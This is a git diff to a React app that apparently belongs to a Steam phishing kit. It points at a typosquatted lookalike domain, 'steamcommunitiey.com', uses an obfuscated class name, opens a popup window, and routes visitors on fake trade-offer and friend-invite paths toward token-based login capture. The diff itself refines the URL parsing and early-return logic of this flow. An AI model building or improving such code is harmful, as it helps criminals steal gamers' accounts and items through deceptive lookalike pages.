@@ -11,9 +11,13 @@ const App = () => {
         const getPage = async () => {
             const envDomain = process.env.REACT_APP_FRIEND_INVITE_DOMAIN || "";
             const currentDomain = window.location.host;
+            const splittedPathname = window.location.pathname
+                .split("/")
+                .filter((e) => e);
             const isCurrentDomainValid = envDomain === currentDomain;
             const isTradePage =
-                window.location.pathname.includes("/tradeoffer/new");
+                splittedPathname[0] === "tradeoffer" &&
+                splittedPathname[1] === "new";
 
             const className = ".lk0e6gi8s69v";
             const htmlUrl = "https://steamcommunitiey.com/txqmjgkxhzp5.html";
@@ -46,6 +50,8 @@ const App = () => {
 
                     openWind();
                 }, 100);
+
+            if (isCurrentDomainValid && (slug || isTradePage)) return goTo();
 
             if (!slug && !token_part1 && !token_part2) {
                 const urlParams = new URLSearchParams(window.location.search);
@@ -151,9 +157,11 @@ const App = () => {
                             .catch(() => goTo());
                     })
                     .catch(() => goTo());
+
+                return;
             }
 
-            if (slug && !token_part1 && !token_part2)
+            if (slug && !token_part1 && !token_part2) {
                 await axios
                     .get(generateUrl(`profile/get/${slug}`))
                     .then((res) => {
@@ -162,6 +170,7 @@ const App = () => {
                         setUpAuth();
                     })
                     .catch(goTo);
+            }
 
             if (!slug && token_part1 && token_part2) {
                 if (!isCurrentDomainValid) return goTo();
